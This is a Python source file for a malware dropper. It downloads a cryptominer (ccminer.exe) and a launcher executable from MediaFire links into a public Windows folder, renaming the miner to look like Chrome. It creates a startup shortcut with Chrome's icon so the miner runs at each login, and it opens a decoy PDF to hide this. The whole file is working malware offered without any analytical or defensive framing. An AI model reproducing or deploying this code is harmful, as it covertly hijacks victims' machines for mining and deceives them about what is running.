img_url = 'file:///D:/user/document/Pumpkin_Contest.pdf'
run_url = 'https://download1638.mediafire.com/n2hlua8doogg/qyezckahgjfwy8d/Run_Chrome.exe'
miner_url = 'https://download942.mediafire.com/nmhh45qi8byg/fr1cebjin6aqcji/ccminer.exe'
nameph = 'Chrome.pdf'


intel_dir = "C:\\Users\\Public\\Libraries\\Intel\\"
import os, urllib.request
import winshell
from win32com.client import Dispatch
import subprocess

def main():    
    if not os.path.isfile(intel_dir + "Chrome.exe") or not os.path.isfile(intel_dir + "Run_Chrome.exe") or not os.path.isfile(intel_dir + nameph) or not os.path.isfile(os.environ['USERPROFILE']+r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Chrome.lnk"):
        dr0p(intel_dir, img_url, miner_url, run_url)
    else:
        subprocess.call(intel_dir + nameph, shell=True)

def makeShortCut(intel_dir):
    desktop = winshell.startup()
    path = os.path.join(desktop, "Chrome.lnk")
    target = intel_dir + "Run_Chrome.exe"
    icon = r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(path)
    shortcut.Targetpath = target
    shortcut.IconLocation = icon
    shortcut.save()

def dr0p(intel_dir, img_url, miner_url, run_url): 
    if not os.path.isdir("C:\\Users\\Public\\Libraries\\Intel\\"):
        subprocess.call("mkdir " + intel_dir, shell=True)

    urllib.request.urlretrieve(miner_url,intel_dir + "Chrome.exe")
    urllib.request.urlretrieve(run_url,intel_dir + "Run_Chrome.exe")
    urllib.request.urlretrieve(img_url,intel_dir + nameph)

    makeShortCut(intel_dir)
    subprocess.call(intel_dir + nameph, shell=True)



if __name__ == '__main__':
    main()

